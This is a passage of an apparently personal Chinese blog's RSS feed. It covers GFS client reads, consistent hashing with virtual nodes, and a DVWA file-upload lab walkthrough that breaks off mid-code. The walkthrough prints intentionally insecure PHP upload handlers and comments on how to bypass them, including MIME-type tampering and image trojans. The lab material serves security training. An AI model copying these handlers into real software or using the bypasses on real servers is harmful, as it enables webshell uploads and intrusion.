&lt;li>&lt;code>Client&lt;/code>指定的文件名和字节偏移转换成文件的一个块索引（&lt;code>Chunk Index&lt;/code>）。&lt;/li>
&lt;li>给&lt;code>Master&lt;/code>发送一个包含文件名和块索引的请求。&lt;/li>
&lt;li>master回应对应的&lt;code>Chunk Handle&lt;/code>(存储数据服务器以&lt;code>Chunk Handle&lt;/code>标识&lt;code>Chunk&lt;/code>)和副本的位置（多个副本）。&lt;/li>
&lt;li>&lt;code>Client&lt;/code>以文件名和块索引为键缓存这些信息。（handle和副本的位置）&lt;/li>
&lt;li>&lt;code>Client&lt;/code>向其中一个副本发送一个请求，很可能是最近的一个副本。请求指定了&lt;code>Chunk Handle&lt;/code>和块内的一个字节区间。&lt;/li>
&lt;li>除非缓存的信息不再有效（cache for a limited time）或文件被重新打开，否则以后对同一个块的读操作不再需要client和master间的交互。&lt;/li>
&lt;/ul></description></item><item><title>一致性哈希算法</title><link>https://sdttttt.github.io/blog/consistent_hash_algorithm/</link><pubDate>Mon, 27 Apr 2020 10:05:10 +0800</pubDate><guid>https://sdttttt.github.io/blog/consistent_hash_algorithm/</guid><description>
&lt;p>第一代分布式系统采用的是中心化的系统，对于存贮大量数据的分布式系统来说它的缺点就是&lt;code>中央节点&lt;/code>成为了整个个分布式系统的&lt;code>单点故障&lt;/code>.&lt;/p>
&lt;p>第二代分布式系统，节点之间通行采用的是&lt;code>广播&lt;/code>，每个节点都向自己相连的&lt;code>所有节点&lt;/code>进行询问，被询问的节点如果不知道这个文件在哪里,就再次进行&lt;code>广播&lt;/code>&amp;hellip;&amp;hellip;如此往复,直至找到所需文件。请求变多就意味着会产生&lt;code>广播风暴&lt;/code>，这会严重占用带宽和系统资源。&lt;/p>
&lt;p>第三代分布式系统开始采用&lt;code>DHT&lt;/code>(Distrbuted Hash Table)，也就是&lt;code>一致性HASH算法&lt;/code>.&lt;/p>
&lt;h2 id="算法背景">算法背景&lt;/h2>
&lt;p>一致性 HASH 算法在 1997 年由麻省理工学院的 Karger 等人在解决分布式 Cache 中提出的,设计目标是为了
解决因特网中的热点(Hot spot)问题,初衷和 CARP 十分类似。一致性 HASH 修正了 CARP 使用的简单哈希
算法带来的问题,使得 DHT 可以在 P2P 环境中真正得到应用。&lt;/p>
&lt;p>但现在一致性 hash 算法在分布式系统中也得到了广泛应用,研究过 &lt;code>memcached&lt;/code> 缓存数据库的人都知道,
&lt;code>memcached&lt;/code> 服务器端本身不提供分布式 &lt;code>Cache&lt;/code> 的一致性,而是由客户端来提供,具体在计算一致性 HASH 时采用如下步骤:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>首先求出 memcached 服务器(节点)的哈希值,并将其配置到 &lt;code>0 ~ 2^32&lt;/code> 的圆(continuum)上。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>然后采用同样的方法求出存储数据的键的哈希值,并映射到相同的圆上。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>然后从数据映射到的位置开始顺时针查找,将数据保存到找到的第一个服务器上。如果超过 2^32 仍然找不到服务器,就会保存到第一台 memcached 服务器上。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://sdttttt.github.io/ConsistentHashAlgorithm/1.png" alt="">&lt;/p>
&lt;p>从上图的状态中添加一台 memcached 服务器。余数分布式算法由于保存键的服务器会发生巨大变化
而影响缓存的命中率,但&lt;code>一致性Hashing&lt;/code> 中,只有在圆(continuum)上增加服务器的地点逆时针方向
的第一台服务器上的键会受到影响。&lt;/p>
&lt;h2 id="性质">性质&lt;/h2>
&lt;p>因为考虑到整个系统的节点数量是动态的，每时每刻有新节点加入和旧节点的失效。
在这类情况下依然要保证系统的可用性，这是值得思考的，尤其是在设计分布式缓存系统的时候。
如果不采用&lt;code>一致性HASH算法&lt;/code>, 客户端在计算数据的 hash 时往往要重新计算(通常这个 Hash 算法和系统中的节点数量有关),
由于 Hash 值已经改变，所以很有可能找不到在整个系统中所对应的节点，导致不可用。所以&lt;code>一致性HASH算法&lt;/code>，在分布式系统中十分重要。&lt;/p>
&lt;p>良好的&lt;code>一致性HASH算法&lt;/code>需要满足一下特点：&lt;/p>
&lt;p>&lt;strong>平衡性(Balance)&lt;/strong>&lt;/p>
&lt;p>平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去,这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。&lt;/p>
&lt;p>&lt;strong>单调性(Monotonicity)&lt;/strong>&lt;/p>
&lt;p>单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中,又有新的缓冲区加入到系统中,那么哈 希的结果应能够保证原有已分配的内容可以被映射到新的缓冲区中去,而不会被映射到旧的缓冲集合中的 其他缓冲区。简单的哈希算法往往不能满足单调性的要求,如最简单的线性哈希:x = (ax + b) mod (P), 在上式中,P 表示全部缓冲的大小。不难看出,当缓冲大小发生变化时(从 P1 到 P2),原来所有的哈希结果 均会发生变化,从而不满足单调性的要求。哈希结果的变化意味着当缓冲空间发生变化时,所有的映射关 系需要在系统内全部更新。而在 P2P 系统内,缓冲的变化等价于 Peer 加入或退出系统,这一情况在 P2P 系 统中会频繁发生,因此会带来极大计算和传输负荷。单调性就是要求哈希算法能够应对这种情况。&lt;/p>
&lt;p>&lt;strong>分散性(Spread)&lt;/strong>&lt;/p>
&lt;p>在分布式环境中,终端有可能看不到所有的缓冲,而是只能看到其中的一部分。当终端希望通过哈希过程 将内容映射到缓冲上时,由于不同终端所见的缓冲范围有可能不同,从而导致哈希的结果不一致,最终的 结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的,因为它导致相同内 容被存储到不同缓冲中去,降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈 希算法应能够尽量避免不一致的情况发生,也就是尽量降低分散性。&lt;/p>
&lt;p>&lt;strong>负载(Load)&lt;/strong>&lt;/p>
&lt;p>负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区 中,那么对于一个特定的缓冲区而言,也可能被不同的用户映射为不同的内容。与分散性一样,这种情况 也是应当避免的,因此好的哈希算法应能够尽量降低缓冲的负荷。&lt;/p>
&lt;p>&lt;strong>平滑性(Smoothness)&lt;/strong>&lt;/p>
&lt;p>平滑性是指缓存服务器的数目平滑改变和缓存对象的平滑改变是一致的。&lt;/p>
&lt;h2 id="虚拟节点">虚拟节点&lt;/h2>
&lt;p>假设在圆上&lt;code>Node A&lt;/code>和&lt;code>Node B&lt;/code>距离过近，按照以上的环形一致 HASH 算法就会发生两个节点所拥有的数据数量不一致的问题。&lt;/p>
&lt;p>&lt;img src="https://sdttttt.github.io/ConsistentHashAlgorithm/2.png" alt="">&lt;/p>
&lt;p>为了解决这种数据倾斜问题，一致性哈希算法引入了虚拟节点机制，即对每一个服务节点计算&lt;code>多个哈希&lt;/code>，每个计算结果位置都放置一个此&lt;code>服务节点&lt;/code>，称为虚拟节点。具体做法可以在服务器 ip 或主机名的后面增加编号来实现。例如上面的情况，可以为每台服务器计算三个虚拟节点，于是可以分别计算 “Node A#1”、“Node A#2”、“Node A#3”、“Node B#1”、“Node B#2”、“Node B#3”的哈希值，于是形成六个虚拟节点：&lt;/p>
&lt;p>同时数据定位算法不变，只是多了一步虚拟节点到实际节点的映射，例如定位到“Node A#1”、“Node A#2”、“Node A#3”三个虚拟节点的数据均定位到 Node A 上。这样就解决了服务节点少时数据倾斜的问题。在实际应用中，通常将虚拟节点数设置为 32 甚至更大，因此即使很少的服务节点也能做到相对均匀的数据分布。&lt;/p></description></item><item><title>File Upload</title><link>https://sdttttt.github.io/blog/file_upload/</link><pubDate>Sun, 12 Apr 2020 10:46:06 +0800</pubDate><guid>https://sdttttt.github.io/blog/file_upload/</guid><description>
&lt;p>DVWA File upload 过关秘籍.&lt;/p>
&lt;h3 id="low">LOW&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 完全没做过滤.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 上传一个PHP文件也是可以的.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="medium">Medium&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// // 开始做了一些过滤
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 下面是官方对$_FILES 函数的描述
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// [name] =&amp;gt; MyFile.txt (comes from the browser, so treat as tainted)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// [type] =&amp;gt; text/plain (not sure where it gets this from - assume the browser, so treat as tainted)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// [tmp_name] =&amp;gt; /tmp/php/php1h4j1o (could be anywhere on your system, depending on your config settings, but the user has no control, so this isn&amp;#39;t tainted)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// [error] =&amp;gt; UPLOAD_ERR_OK (= 0)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// [size] =&amp;gt; 123 (the size in bytes)
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 其中对name和type的description的描述都是 `treat as tainted`(被污染的)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 这意味着它有可能会被修改 unsafe
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 我们可以尝试上传一个PHP文件，使用一些拦截请求工具，修改即将发出的请求.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 来达到修改`name`中的后缀名和`type`中的媒体类型.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high">High&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// jpg
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// file size
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// tmp_name 是临时副本的名字
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 和上面的比起来多个一个文件后缀名的判断.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// strtolower 转小写
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 扩展名只要满足jpeg,png或者jpg就行
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="c1">// getimagesize 获取图像信息
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 这个函数保证你穿的一定得是个图像
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 可以用图片木马绕过
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
